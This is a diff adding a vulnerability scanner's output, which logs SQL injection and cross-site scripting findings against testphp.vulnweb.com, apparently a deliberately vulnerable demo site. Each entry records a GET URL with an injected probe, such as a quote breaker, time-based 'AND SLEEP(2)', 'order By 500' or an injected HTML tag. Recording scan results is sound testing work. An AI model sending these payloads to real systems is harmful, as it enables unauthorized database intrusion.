@@ -1,0 +1,49 @@
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/artists.php?artist=1鎈'"\(
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/artists.php?artist=1 AND SLEEP(2)
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/listproducts.php?cat=</div><arcbvyf>
+Vuln_type:xss
+Level:middle
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/listproducts.php?cat=1 order By 500 
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/listproducts.php?cat=1 AND SLEEP(2)
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/AJAX/infoartist.php?id=1鎈'"\(
+Vuln_type:sqli
+Level:high
+
+
+[vuln]
+Method:GET
+Url:http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 AND SLEEP(2)
+Vuln_type:sqli
+Level:high
+
